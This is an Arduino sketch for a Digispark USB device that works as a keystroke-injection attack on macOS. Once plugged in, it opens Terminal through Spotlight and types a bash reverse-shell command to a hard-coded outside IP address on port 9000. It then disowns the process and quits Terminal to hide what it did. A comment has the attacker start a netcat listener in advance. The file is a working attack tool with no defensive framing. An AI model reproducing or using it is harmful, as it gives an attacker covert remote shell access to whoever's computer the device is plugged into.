#include "DigiKeyboard.h"

//Command key is ord 37 and as a modifier 0x00000008
#define MOD_CMD_LEFT 0x00000008
boolean do_hack = true;

void setup() {
  // don't need to set anything up to use DigiKeyboard
}

void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  
  //cmd+space
  if (do_hack) {
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_CMD_LEFT);
    DigiKeyboard.delay(250);
    DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("terminal");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    //Ahead of time you want a machine at IPADDRESS listening on port 9000  `nc -l 1337`
    DigiKeyboard.println("nohup bash -i >& /dev/tcp/51.15.45.133/9000 0>&1 &");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("disown $!");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_CMD_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    do_hack = false;
  }
  DigiKeyboard.delay(10000);
}
